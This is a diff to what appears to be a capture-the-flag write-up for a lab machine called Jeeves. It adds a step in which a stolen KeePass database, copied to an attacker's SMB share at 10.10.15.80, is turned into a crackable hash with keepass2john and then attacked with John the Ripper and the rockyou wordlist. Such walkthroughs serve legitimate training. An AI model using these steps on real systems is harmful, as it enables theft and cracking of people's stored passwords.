@@ -209,6 +209,15 @@ copy CEH.kdbx \\10.10.15.80\share\CEH.kdbx
 ```
 
 ```
+ keepass2john CEH.kdbx
+CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+                                                                                                                    
+┌──(kali㉿kali)-[~/machines/jeeves]
+└─$ nano CEH.hash
+
+```
+
+```
 john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (KeePass [SHA256 AES 32/64])
